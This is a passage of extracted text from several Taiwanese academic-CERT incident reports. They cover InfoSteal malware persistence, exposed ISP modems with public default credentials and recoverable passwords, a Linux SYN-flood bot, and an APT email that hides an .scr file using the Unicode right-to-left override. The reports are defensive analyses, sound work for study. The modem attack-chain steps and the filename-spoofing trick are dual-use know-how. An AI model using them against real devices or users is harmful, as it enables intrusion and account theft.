        "content": ".exe 執行時有開啟三個 port:65531~65533,連線狀態一直為Listening。 3. 檢查主機上防火牆的輸入規則設定,發現三個非系統本身預設的規則,分別 為ShareService、UDP 與UDP2,這三個規則開啟了本機端的65533、65532 與65531port,允許主機上的任何程式執行時,讓任何人從遠端任何位址來進 行連線,推測這些port 的開啟為駭客的攻擊行為之一。 4. 檢視背景程式運作情形,發現有三個程式的Description 與Company Name 為 空白,正常的程式應該有資訊,推測可能為惡意程式。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 查看程式svchost.exe、wmiex.exe 與taskmgr.exe 在主機內的檔案存放位置, 發現在那些位置無法看到這些程式,要透過將資料夾選項的檢視設定修改為 「不隱藏保護的作業系統檔」之後才看得到這些檔案,讓使用者不容易發現 它們的存在。 修改設定後發現在c:\\Windows\\SysWOW64\\drivers 與c:\\Windows\\SysWOW64 這兩個資料夾出現程式taskmgr.exe、svchost.exe、wmiex.exe 與svhost.exe, 而其中taskmgr.exe 與svchost.exe 這兩個系統檔案所在位置不是系統預設的存 放位置。另外,由建立日期判斷此為InfoSteal.exe 執行後所產生的檔案,其 中svchost.exe 與svhost.exe 兩者建立時間相同,而且檔案大小相同,推測可 能為相同檔案。 6. 從程式svchost.exe、wmiex.exe 與taskmgr.exe 的屬性「Strings」內容,發現 這三個程式的字串都提到賽門鐵克的憑證與憑證下載網址,推測這三個惡意 程式可能被嵌入賽門鐵克的憑證,這樣竊取憑證的設計容易造成防毒軟體判 定它為合法的程式。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team",
        "Page_Num": "3,4,5"
    },
    "140": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 程式taskmgr.exe、svchost.exe、wmiex.exe 與svhost.exe 經virustotal 檢測其惡 意比例分別為50/71、63/72、56/69 與63/72,其中svchost.exe 與svhost.exe 的檢測結果相同,也發現svchost.exe 與一開始樣本InfoSteal.exe 的SHA256 值相同,推測惡意程式InfoSteal.exe 執行後除了刪除自己外,另在系統檔所 在資料夾中複製一份自己,並且隱藏起來,此種攻擊手法不容易讓使用者發 現它的存在。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 查看連線美國IP:23.41.139.27 的封包內容,發現該IP 會對應到兩個網址 http://s2.symcb.com 與http://sv.symcd.com,從IP:23.41.139.27 所回應內容,可 以得知受害主機連線至該IP 下載賽門鐵克所核發的憑證。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢視背景程式的Process Tree 紀錄,發現InfoSteal.exe 執行後,會呼叫幾個程 式來執行,大致可將執行程序以主要程式分成InfoSteal.exe(PID:1708)、 svchost.exe(PID:908)、wmiex.exe(PID:3852)與svchost.exe(PID:1684)等幾個部 分。 (1) InfoSteal.exe(PID:1708)執行後 它會在C:\\Windows\\temp 內產生ttt.exe,之後會執行taskkill.exe(PID:1720) 來強制結束程式wmiex.exe。 接著會透過cmd.exe 執行schtasks.exe 來強制刪除任務名稱為WebServers 的排程,之後建立一個新的WebServers 排程工作,來執行 c:\\windows\\SysWOW64 資料夾內的wmiex.",
        "Page_Num": "5,6,7,8"
    },
    "141": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "exe。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team InfoSteal.exe 執行後也會呼叫cmd.exe(PID 624)來強制結束排程svhost.exe、 svhhost.exe 與svvhost.exe 等程序,並且移動svvhost.exe 與svchost.exe 至 c:\\windows\\temp 內,而且會刪除位於c:\\windows\\system32 內的svhhost.exe 與位於c:\\windows\\syswow64 內的svhhost.exe。 接著cmd.exe 會執行一個判斷程序,當process 名稱為svhost.exe、svhhost.exe 或svvhost.exe 時終止該程序的執行。之後cmd.exe 會透過WMIC.exe 去執行 下列判斷程序:(1)如果Process 的執行路徑在%drivers%的路徑內,而且檔案名 稱為taskmgr.exe,則結束該程序(2) 如果Process 的執行路徑在%drivers%的 路徑內,而且檔案名稱為svchost.exe,則結束該程序(3) 如果Process 的執行 路徑在%emp%的路徑內,而且檔案名稱為svchost.exe,則結束該程序,推測 此行為是駭客用來偵測主機是否曾經感染過此惡意程式的判斷程序。 InfoSteal.exe 執行時也會透過cmd.exe 來執行netsh 指令,開啟3 個 65531~65533的port,這些port的規則名稱分別為UDP2、UDP 與ShareService。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 接著會透過cmd.exe 執行schtasks.exe 來強制刪除任務名稱為Ddrivers 的排 程,之後建立一個新的Ddrivers 排程工作,來執行 c:\\windows\\SysWOW64\\drivers 資料夾內的svchost.exe。 (2) svchost.exe(PID:908)執行後 它會呼叫taskeng.exe 來執行cmd.exe,而cmd.exe 會分別執行位於 c:\\windows\\Sys",
        "Page_Num": "8,9,10"
    },
    "142": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "WOW64\\wmiex.exe 與 c:\\windows\\SysWOW64\\drivers\\svchost.exe 的兩個程式,來開始WebServers 與Ddriver 兩個工作排程。 (3) wmiex.exe(PID:3852)執行後 它會呼叫wmic.exe(PID:3180)來取得UUID 與macaddress 資訊。 (4) svchost.exe(PID:1684)執行後 在c:\\windows\\SysWOW64\\drivers 資料夾內的svchost.exe 執行後,它會呼  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 叫位於同一個資料夾內的程式taskmgr.exe,接著會使用cmd.exe 執行8 次 WMIC.exe,來檢查taskmgr.exe、svchost.exe、explorer.exe、spoolsv.exe、 conhost.exe、csrss.exe、services.exe 與msdtc.exe 等8 個程式的執行路徑, 若不符合則終止該程式的程序。 之後會使用cmd.exe 一直重複執行這8 次的WMIC.exe。此外,它也會透 過執行wmic.exe 來取得UUID、macaddress 與VideoController 等資訊。 10. 檢視主機啟動後程式執行設定、排程工作與服務內容,發現 c:\\windows\\syswow64\\drivers 資料夾內的svchost.exe 與c:\\windows\\syswow64 資料夾內的wmiex.exe 在主機重新啟動後會自動執行,而且也列入工作排程 與服務內容之一。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 1.使用者從惡意網站感染、下載惡意程式。 2.惡意程式在受害主機上被執行後,產生下列各個行為: (1)刪除自己並執行本身修改後另存為temp\\ttt.exe 的副本。 (2)將自己移動到%system%\\wmiex.exe。 (3)建立工作排程WebServers 來執行wmiex.exe。 (4)執行wmiex.exe ",
        "Page_Num": "10,11,12"
    },
    "143": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "取得UUID 與macaddress 資訊。 (5)檢查檔名為svhost.exe、svhhost.exe 或svvhost.exe 時,則終止程序。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (6)檢查taskmgr.exe 與svchost.exe 的執行路徑,若符合則終止程序。 (7)開啟主機的65531~65533 port。 (8)建立本身的副本並將它另存為%system%\\svhost.exe。 (9)將自己移動到%system%\\drivers\\svchost.exe。 (10)建立持續性的工作排程Ddriver。 (11)刪除自己並執行%system%\\drivers\\taskmgr.exe。 (12)執行%system%\\drivers\\svchost.exe。 (13)檢查taskmgr.exe、svchost.exe、explorer.exe...等8 個程式的執行路徑, 若不符合則終止程序。 3.連線賽門鐵克憑證伺服器(美國IP:23.41.139.27)下載憑證。 四、建議與總結 1. 本個案的攻擊手法主要在感染主機後,將惡意程式安裝於Windows 系統 檔存放的資料夾內,會檢查是否有相關的舊版本軟體存在,透過刪除與初 始化將這些舊版本軟體、檔案和程序重新安裝與設定,來讓受害主機感染 最新版的惡意軟體。 2. 該惡意程式在執行後,會利用自己本身的資源建立一個 c:\\windows\\temp\\ttt.exe 來啟動更新作業。 3. 它會檢查檔案名稱是否為svhost.exe、svhhost.exe 或svvhost.exe,如果不 是,則會終止所有舊版的惡意軟體、啟用防火牆,並且開放port。 4. 它會在驅動程式中植入修改後的自身副本,並建立一個工作排程來執行 wmiex.exe,作為線上連線來傳送系統資訊。 5. 由於它開啟65531~65533port,能讓任何程式從任何來源來使用這些port, 容易讓駭客為遠端管理植入駭客工具於主機內。 6. 放於主機系統檔資料夾內的惡意程式,一般是隱藏狀態,如果不",
        "Page_Num": "12,13"
    },
    "144": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "解除隱藏  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 保護,則使用者看不到它們的存在,將使它們持續潛伏在受害主機內來竊 取資訊。 7. 關於本個案之資安防護措施,有下列幾點建議提供參考。 (1) 不隨意瀏覽不明來源的網站。 (2) 不隨意點選不明來源的連結。 (3) 定期更新系統、修補漏洞與更新病毒碼。 (4) 定期檢視主機port 開啟的狀況。 (5) 定期使用防毒軟體進行全系統的完整掃描。 五、相關報導 1. Monero Miner-Malware Uses RADMIN, MIMIKATZ to Infect, Propagate via Vulnerability https://blog.trendmicro.com/trendlabs-security-intelligence/monero-miner-malware -uses-radmin-mimikatz-to-infect-propagate-via-vulnerability/ ",
        "Page_Num": "13,14"
    },
    "145": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": "個案分析- ISP 電信數據機資安漏洞 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/11  1 I. 事件原由 A. 10/15 部分新聞媒體報導某ISP 電信P874 數據機有資安漏洞,可能造成 WIFI 帳號密碼外洩。 B. 中時電子報:【中華電Wi-Fi 洩個資 民眾氣憤罵很瞎 】 註:新聞來源,http://goo.gl/hfzeKN C. 蘋果日報:【中華電 Wi-Fi 數據機洩個資,隱瞞型號P874 可被攔截帳密 「很瞎」】 註:新聞來源,http://goo.gl/2KMoKg 在家上網WiFi 的帳號密碼居然會被人查到,中華電信內建WiFi 的數據機爆出資訊安全漏 洞,出包的P874 型號幾乎都用在50M 光世代用戶的家中,目前用戶至少90 萬,不過中 華電信說祇有開啟遠端搖控的人才會受到影響。 用遠端升級的方式來修正問題,不過帳號密碼被盜也讓人擔心,會不會引發個資外洩,甚 至是小額付款功能被破解。 不在家用範圍內,拿著密碼也沒用,但資料有外洩疑慮,消基會批評業者應該主動告知, 並且負責損失,主管機關NCC 也表示會介入調查。 【徐 毓莉╱台北報導】中華電信內建Wi-Fi 數據機遭爆資安漏洞。有民眾投訴指中華電信 部分P874 型號數據機,可輕易查出個人的無線網路帳號密碼,造成個資外洩,甚至遭有 心人士利用。中華電信坦言知此瑕疵,已在更新改善,但未公布影響範圍。消基會批業者 隱匿;民眾也罵:「很瞎!至少該先通知、讓民眾可保護自己。」 該批出包的數據機是內建Wi-Fi 的P874 型號,以往多用在50M 光世代用戶家中,估計現 有用戶至少90 萬戶,但中華電信昨稱僅少部分戶數受影響,未公布確切的受影響戶",
        "Page_Num": "1,2"
    },
    "146": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": "數。 國家通訊傳播委員會(NCC)表示,會進一步調查。  2 II. 數據機P874 機型檢測 A. 使用筆者自家的數據機進行檢查,實地檢測數據機是否有如報導所言。 B. 透過自家內部網路電腦的私有IP 連到數據機LAN 的預設IP 192.168.1.1。 C. 數據機網頁管理資訊: 1. 系統資訊,確認韌體版本預設設定。 2. WAN 端資訊,表示數據機有做硬體撥接,故有取得公開IP 在WAN 端上,使內部網路電腦能DHCP 取得私有IP,透過NAT 轉出上網。 3. 預設Access Control List 資訊 恐成小額付款漏洞 任 職外商科技公司的藍姓工程師向《蘋果》投訴指,近期發現有近100 組以上的網路位 址(IP)掃描他的防火牆漏洞,基於好奇,他也掃了同網段的IP,發現許 多浮動IP 都有 漏洞,再輸入網路上可找到的數據機帳號和密碼,登入後竟看到他人的無線網路服務群組 識別碼(SSID)名稱和Wi-Fi 連線密碼。 藍姓工程師質疑,輕易就可知道鄰居的無線上網密碼,意味著他自己的資料也會被輕易查 出,被發現後恐遭用做其他不當用途,相關資料外洩或會造成小額付款漏洞。 《蘋果》記者撥打投訴人查到一組疑為手機號碼組合的密碼,接電話的民眾蘇先生確為 50M 光世代用戶,且表示該組帳號是家中門牌號碼、密碼是手機號碼,獲悉此事批說:「很 瞎!中華電信至少應通知,讓民眾懂得保護自己。」 辯稱:拿到也沒用 中 華電信回應說,僅P874 型號中的極少數數據機有瑕疵,都是光世代用戶且用中華電信 贈送的家用Wi-Fi 使用者,但需電腦網路高手使用專業軟體,才可進入 截取少部分數據 機的Wi-Fi SSID 和密碼,且浮動IP 並無地域性,「知道密碼也沒辦法做什麼動作」,但 為免消費者疑慮,4 月起已",
        "Page_Num": "2,3"
    },
    "147": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": "透過升速陸續進行遠端更新,只要用戶數據機有插電、 就可 被更新,但未統計影響用戶。 資安網站「大砲開講」站長邱春樹表示,此可能風險包括有心人可透過進入數據機取得相 關資料,恐造成個資外洩、電腦中毒、被當殭屍電腦運用、遭詐騙等。 專家:應全面回收 東華大學資訊工程系教授張瑞雄也說,若有瑕疵,業者有責任告知受影響的使用者,「萬 一在解決之前民眾有損失,該由誰負責?就像買東西有瑕疵,應全面回收處理。」 消基會秘書長雷立芬表示,涉及個資外洩,發現當下就應主動告知消費者,如汽車有瑕疵 就召回,而非隱匿不通知,若真的有人利用資料做壞事,損失就應由業者負責。  3 D. 預設的ACL 中,WAN 端的SSH 是Enable 的,表示網際網路上的有心人 士可以嘗試使用SSH 連線登入數據機。  4 E. 預設的登入帳號密碼在網路上是公開的,可能是使管理者易於登入管理, 但同時也易於駭客入侵,登入後的頁面如下。 F. 登入後發現所有進階的功能都能在此設定。 1. VDSL Link State:此處能觀測到使用者租用的頻寬資訊。 2. WAN:此處能看到用戶數據機的WAN 介面資訊,有出現PPPOE 的公 開IP。  5 3. 第10 項遠端管理的Password 可以直接被修改,可能為駭客獨佔所用。 4. 第12 項的Reboot 可以做為重開機,使用中的用戶網路被中斷,然後 重開機後PPPOE 取得的動態IP 可能就不會一樣。 5. Management:此為最重要的選項,裡面有個Backup 選項可以將用戶 的VDSL 撥接設定透過TFTP 方式匯出,並存成 “XXX.conf”檔案。 a. 用一般的記事本開啟發現裡面的設定是用XML 紀錄,包含使用者 的 「撥接的帳號和密碼」及「遠端管理的帳號和密碼」。 b. 其中「遠端管理的帳號",
        "Page_Num": "3,4,5,6"
    },
    "148": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": "和密碼」是明文顯示 c. 而「撥接的帳號和密碼」的帳號是明文,密碼則是用簡易的Base64 加密字串,透過Base64 Decoder 就能輕易解開。  6 G. 通常有做硬體撥接的數據機都使因為預設Wireless 是enable 的,故常會將 wireless 的登入密碼用手機或市話號碼,此為明文記錄在設定檔裡。 III. 網段掃描檢測 A. 透過上面的自我檢測後,追查是否為個案或通案,故掃描同網段其他動態 分配到的數據機IP 是否也有相同問題,port SSH 是開啟的。 B. 因為數據機只要reboot 後WAN 取得的IP 都是變動的,除非是有設定固 定IP,因此儼然已成為嚴重資安漏洞,因為一般用戶根本不會自行去關 閉PORT SSH。 IV. 撥接帳號與密碼的用處 A. 使用者取得撥接的帳號密碼就能夠登入電信業者的網站,取得個人相關資 料,例如帳單資訊、固定IP 位址查詢、查詢及修改註冊人email 或者可 能作為「小額付費」的其他用途。 B. 固定IP 常作為伺服器使用,例如web server、NAS 或監視器等,駭客透 過帳號密碼查詢到固定IP 後就能嘗試登入,竊取個資和植入後門程式。 C. 數據機的WIFI 密碼駭客也能進行修改,讓服務中斷或竊取client 的設備 資訊。  7 D. 如果駭客已經取得用戶的市內電話號碼,可能變更用戶的頻寬租約等。 E. 目前測試無法使用他人帳密在其他地方進行撥接上網。 V. 數據機DSL-6641 檢測 A. 透過朋友允許測試租用的DSL-6641 數據機,該數據機因為啟用WIFI 功 能,故有硬體撥接在WAN 介面上會有一個實體IP。 B. 赫然發現該機型的SSH 協定是Enabled,而且無論是WAN 或LAN 都能 用預設帳號密碼登入。 C. 值得注意的是在設定選單中無法手動關閉此SSH 協定",
        "Page_Num": "6,7,8"
    },
    "149": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": ",只能透過更改預 設帳號密碼防止駭客輕易登入,或者使用Filter 限制連入來源。 D. 透過檢視WLAN 設定可以看到WIFI SSID 的登入密碼“PSK String”,通常 用戶都會用電話做為密碼,也就是用戶的附掛電話或手機號碼。 E. 設定選單中的Backup 選項中可以匯出數據機設定檔,只是該設定檔為bin 格式檔,內部的設定無法直接用文件編輯器解析出來,但若為高階駭客也 許可以破解出其中的撥接帳號密碼。  8 VI. 網路入侵架構圖 VII. 數據機漏洞可能造成的影響 A. 以上P874 和DSL-6641 兩種機型的出廠預設值皆有重大漏洞,外部網路 Internet Hacker STEP 2 伺服器 STEP 1 : 駭客使用IP Port Scan 找尋WAN端SSH或HTTP開啟的數據機。 STEP 2 : 駭客找到可入侵的數據機後開始用公開預設的帳號密碼登入管理。 STEP 3 : 駭客使用Backup竊出PPPOE撥接的帳號密碼。 STEP 4.1-4.2 : 駭客透過PPPOE帳密可在ISP會員網站查詢到個資及申請的固定IP。 STEP 5 : 駭客可能入侵固定IP的設備,如監視器系統或其他伺服器。 STEP 6 : 駭客可能利用帳密啟用線上小額付款機制消費。 MODEM MODEM MODEM 網路監視器 個人電腦 STEP 1 STEP 3 STEP 4.2 STEP 4.1 ISP 會員資訊網站 STEP 5 STEP 5 STEP 5 ISP 線上小額付費 STEP 6  9 的人都能透過IP scan 的方式去找出有開啟TCP PORT 的數據機。 B. 電信業者的數據機製作廠商預設上皆是讓SSH 或HTTP 能夠從WAN 端 連入,只是預設工程帳號密碼卻是網路上被公開的,輕易開啟大門讓駭 客進入。 C. 根據韌體版本的不同,可能啟用的WAN PORT 也會有差,但都能掌控數 據機所有設定。 D. 一旦撥接帳號密碼及電話被竊取,就能輕易透過網站查到登記人的資訊, 例如固定IP 通常用來作為伺服器或監視器系統用,可能就能被",
        "Page_Num": "8,9,10"
    },
    "150": {
        "File_Name": "個案分析-ISP電信數據機資安漏洞事件分析報告.pdf",
        "content": "駭客所破 解登入。 E. 個資外洩之外還可能用來做線上小額付款,或者線上修改撥接密碼,無 須額外的身分認證機制,例如手機簡訊驗證碼機制,讓用戶無法得知密 碼被竄改。 VIII. 建議措施 A. 請使用者透過內部網路 192.168.1.X 登入數據機管理介面192.168.1.1 進行管理密碼修改。 B. 關閉WAN 端所有PORT 的服務,僅允許內部LAN IP 進行登入。 C. 盡速修改PPPOE 撥接上網的密碼,以避免被駭客竄改後無法使用。 D. DSL-6641 因為無法手動關閉WAN 的SSH,故建議請ISP 業者更換其他 機型設備,並確認WAN 的服務已關閉。 E. PPPOE 撥接上網密碼因最多只能設置8 個字元,且不能有特殊符號,故 建議定期修改以避免被破解。 F. 若數據機本身有啟用WIFI AP 功能,請不要設定SSID 密碼為家用電話 或手機號碼,避免容易被破解。 ",
        "Page_Num": "10"
    },
    "151": {
        "File_Name": "個案分析-K單位對外發送SYN Flood攻擊的主機事件分析報告_10404.pdf",
        "content": "個案分析- K 單位對外發送SYN Flood 攻擊的主機事件分 析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/4  1 I. 事件簡介 1. 該學術單位資安人員發現有一台主機占用大量頻寬,疑似遭受病毒感 染,請本單位進行協助鑑識排除。 2. 該主機為一台VM 虛擬主機,使用作業系統為Linux 的Centos 版本。 3. 該主機主要有網頁服務供學生能夠登入使用,且有啟用SSH Server 的服 務供管理者可以登入管理。 4. 該單位資安人員提供此主機的VM 映像檔給本單位進行調查鑑識。 II. 事件檢測 1. 首先透過SSH 連入該主機,並使用指令netstat 觀察網路通訊埠的連線 狀態,得知除了預設的port 80、22 之外,尚有其他可疑連線正在活 動。 2. 檢查Web service 的access log,並無發現異常的連入狀態,排除掉可 能的 phpmyadmin 和 shellshock 網站漏洞。 3. 從圖中紅框標示知道,有一支名為lss 的程式正在與 218.244.148.150 的port 25000 進行SYN_SENT 的資料傳送,而該主機是位於中國北京, 可能是作為報到中繼站用途。 4. 接著透過指令 lsof 觀察該程式lss 的運行狀況,可以得知lss 位於路 徑 /tmp/ 中,並啟用兩個PID 為1681 和6823 的程序,皆是向中繼站 218.244.148.150 進行SYN SENT 動作。此時也發現到另一支惡意程式  2 /tmp/gates.lod 也參與其中。 5. 透過線索檢查 /tmp/ 中發現到其他可疑檔案gates.lod 和moni.lod, 該兩個檔案也是執行檔,系統中會以綠色顯示。 6. 嘗試手動將背景程式lss 進行kill,發現就算移除後一段時間還是會再 次產生新的lss 程序。故再次進行程序kill,並且手動將檔案lss 進行 刪除,經過短暫時間該程式lss ",
        "Page_Num": "1,2,3"
    },
    "152": {
        "File_Name": "個案分析-K單位對外發送SYN Flood攻擊的主機事件分析報告_10404.pdf",
        "content": "又再次復活執行。最後嘗試將三個檔案 都進行刪除,經過短暫時間該三個檔案又再次還原並執行,此時便能確 定應還有其他程式在監控主導還原,故此 /tmp/ 下的惡意程式並非源 頭。 7. 此圖可以看到lss 還原後會再次執行,且PID 從原本的6823 變為 19082。  3 8. 為了找出源頭的惡意程式,透過指令lsof 觀察惡意程式 moni.lod 的行 為,發現到該程式的父程式名為 .sshd 的隱藏檔,其PID 為19115。 9. 再次透過指令lsof 查詢程式 .sshd 的行為,能看到它的存在路徑為 /usr/bin/.sshd ,因為它是隱藏檔故不易從ls 指令看出。 10. 因為該惡意程式會在開機時候自動啟動,表示說該惡意程式一定有執 行可開機啟用的腳本中。分別追查 .sshd 及 lss 這兩支執行檔的啟用 情形後,發現只有 /tmp/lss 被寫入 etc/rc[1- 5].d/S97DbSecuritySpt,對應到的實體路徑為 /etc/init.d/DbSecuritySpt。 11. 由啟動的腳本得知,lss 應該才是惡意程式的主體,而 .sshd 則是 lss 執行後產生出的 watchdog 監控程式,用來還原 lss 、moni.lod 和 gates.lod 惡意程式。故以上lss 和.sshd 惡意程式必須都刪除掉才 能阻止再次還原。  4 12. 仔細比較 lss 和.sshd 的差異,這兩支檔案都是執行檔,且檔案大小 都是1.2M 的大小,且.sshd 可以在無網路環境下還原被刪除的lss 檔 案,故 lss 和.sshd 實質上為同一支程式。 13. 觀察惡意程式產生的網路流量封包得知,該惡意程式 lss 一開始會向 中國北京上層主機 218.244.148",
        "Page_Num": "3,4,5"
    },
    "153": {
        "File_Name": "個案分析-K單位對外發送SYN Flood攻擊的主機事件分析報告_10404.pdf",
        "content": ".150 的port 25000 進行SYN_SENT 的資 料傳送。可以看到封包中帶有感染主機的linux 版本資訊,且上層中繼 站會回傳IP 資訊154.35.164.8,此IP 為被感染主機攻擊的目標。 14. 從封包紀錄來看感染主機在短短2 分鐘內就向154.35.164.8 的port 80 發送了259,008 個1KB 的TCP SYN 封包,大約是17.27Mbps,也就是 SYN Flood 攻擊阻斷Web 服務。 15. 瀏覽被攻擊的主機IP,是一個位在美國的“博訊新聞”網站,引述維 基百科說明,『博訊新聞網,是一個中文資訊網,基於公民記者模式運  5 作。主要報道國際時事新聞,以及來自中國大陸的消息。但不時有分析 人士認為博訊與中共高層有非常複雜的關係。』 III. 惡意程式運作流程圖 Hackers STEP 4 SSH 寫入開機啟動腳本 .sshd /usr/bin/ lss moni.lod gates.lod /tmp/ S97DbSecuritySpt /etc/rc[1-5].d/ STEP 1 SSH 植入lss STEP 2 lss 產生 .sshd STEP 3 監控存活並還原檔案 lss、moni.lod、gates STEP 5 開機自動執行 /tmp/lss 1. 駭客透過SSH 植入惡意程式至 /tmp/lss 。 2. 執行lss 後產生出看門狗程式 .sshd 和 moni.lod 及 gates.lod。 3. 看門狗程式 .sshd 持續監控/tmp/中的三支程式是否存活並能夠還原。  6 4. 駭客寫入開機自動執行惡意程式/tmp/lss 的腳本S97DbSecuritySpt。 5. 就算主機重開機也能夠自動執行惡意程式lss。 IV. 網路架構圖 Hackers STEP 4 SYN Flood攻擊 154.35.164.8 Port 80 遭入侵的主機 140.X.X.Y (TANET",
        "Page_Num": "5,6,7"
    },
    "154": {
        "File_Name": "個案分析-K單位對外發送SYN Flood攻擊的主機事件分析報告_10404.pdf",
        "content": ") 154.35.164.8 博訊新聞網 STEP 2 殭屍主機報到 Port 25000 STEP 1 SSH 弱密碼入侵 中繼站 218.244.148.150 (北京) STEP 3 回覆被攻擊者IP 154.35.164.8 1. 駭客透過SSH 方式弱密碼入侵受害主機並植入惡意程式。 2. 惡意程式開機執行後持續向上層中繼站218.244.148.150 進行報到動作。 3. 中繼站收到報到的主機資訊後會回覆將被攻擊者的主機IP。 4. 遭入侵的主機收到將被攻擊者主機IP 後,開始向154.35.164.8 的port 80 進行 SYN Flood 攻擊,以阻斷該主機Web 服務。 V. 建議與總結 1. 此次受害主機遭受駭客透過SSH 弱密碼方式入侵並植入惡意程 式 .sshd。 2. 在背景進行網路通訊的惡意程式偽裝成lss 的檔案名稱。 3. 植入的惡意程式具有watchdog 的功能,也就是 .sshd 會持續監控  7 lss、moni.lod 和gates.lod 的存活,一旦這三個惡意程式被移除都能 夠透過 .sshd 還原。 4. 駭客在 /etc/rc[1-5].d/ 寫入開機啟動的腳本 S97DbSecuritySpt,會 自動執行 /tmp/lss 惡意程式。 5. 雖然 .sshd 能夠還原其他惡意程式,反之 lss 也能還原被刪除 的 .sshd 惡意程式。故要同時刪除 .sshd 和lss 才能徹底移除病毒。 6. 感染的主機持續會接收上層中繼站命令去SYN Flood 攻擊特定IP 主機。 7. 建議將主機的root 密碼強度增強,並限制SSH 來源端網段連線限制,確 保不會遭受駭客破解入侵。 8. 時常檢查是否有大量異常網路流量,或檢查服務的網路連線狀態是否異 常,確保無遭受惡意程式感染。 ",
        "Page_Num": "7,8"
    },
    "155": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "個案分析- K 大學APT 社交工程郵件事件 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/10  1 前言 APT 社交工程郵件說明 1. APT:進階持續性滲透攻擊 (Advanced Persistent Threat),簡易來說就是 針對特定組織所作的複雜且多方位的網路攻擊。 2. 惡意社交工程郵件:這是 APT 攻擊中最常見的方法,駭客會分析對象 的組織背景和社交對象,量身製作一個看起來非常合理的郵件,郵件通 常會夾帶文件附檔或連結網址,誘發使用者上當開啟。 3. 郵件附加的惡意檔案並不是容易被察覺的 exe 檔,此次是偽裝成DOC 檔的SCR 螢幕保護程式,駭客只需透過插入右向顯示unicode 就能完成 附檔名反向顯示。為了取信使用者,執行後還產生出一個真的word 文件 檔。 4. 當使用者不小心打開該檔案後,就會使感染電腦連上駭客使用的 C&C Server,以便長期潛藏在使用者電腦中,竊取個人資料和帳號密碼。除 此之外還可能透過內部網路,持續進攻、滲透其他台電腦,以便取得其 他人的資料。 事件說明 一、 事件過程: 1. 該校於2013/7 中旬確認副校長及相關一級主管,收到滲透式攻擊手法製 作的社交工程信件,該信件的附加檔案請參考本封郵件的附加檔案。 2. 有人假冒秘書處第一組 Y 組員名字使用<hxxxxxx@gmail.com> 寄出郵 件信件主旨「第647 次行政會議」,信件夾帶的附檔名稱為「第647 次行 政會議議程.7z」。 3. 2013/07/15 該校業務人員將該封信件附檔轉送於TACERT 進行測試分 析。 4. 此事件為很明顯的針對性APT 攻擊,特地準備易使受害者開啟的郵件資 料,並透過寄件人偽裝方式讓受害者更無疑有他而開啟。 二、 檢測先前準備: 1. 將該「第647 次行政會議議程.7z",
        "Page_Num": "1,2"
    },
    "156": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "」(約77KB)解壓縮後為「第647 次行政 會議議程rcs.DOC」(約110KB)。表面上看起來副檔名為.doc 的word 檔案, 事實上駭客利用Unicode 既有的「右向文字」更改檔名的顯示方式,故真 實的檔名為「第647 次行政會議議程COD.scr」,此為windows 螢幕保護 程式的惡意執行檔案。 (1). 阿拉伯文採用右向文字顯示方式,故其障眼法常為駭客所用。  2 (2). 注音鍵盤輸入 ` 後,再輸入鍵盤左側數字u202e 即可插入右向顯示。 2. 同時此檔案圖案(logo)也被偽裝成Office Word 的圖案。 3. 先將此檔案上傳至Virustotal 檢測發現,病毒檢出比例為13/47,約28% 的檢出率,故能成功騙過大多數的防毒軟體,以下為該7z 檔的Hash 值。 (1). SHA256:448357791c7c6700e7a756345233be59a0a685e2b331c6ce3b067 3c20f1bf5d3 (2). MD5: 4b5f4a003538c2f17f940eb05ddecf99 4. 2013/07/15 本單位先進行實體機器執行測試該病毒執行情形: (1). 測試主機為 Asus 的Eee PC 筆記型電腦。 (2). 使用的作業系統為 WinXP (x86) sp2,無安裝任何修補程式。 (3). 所安裝的Office 版本為2007 版,無安裝任何修補程式。 (4). 並用Wireshark 側錄該感染主機之Pcap 封包。 (5). 並使用Currport 每2 秒去紀錄網路連線埠號的使用狀況。 三、 網路架構示意圖 四、 檢測過程: 1. 將該惡意檔案執行後會產生一隻叫做『JavaQuick.exe』程式開始於背景執 行,該程式藏匿於C:\\Documents and Settings\\User\\Application Data\\JAVA\\ 底下。Win7 的路徑為C:\\Users\\user\\AppData\\Roaming\\",
        "Page_Num": "2,3"
    },
    "157": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
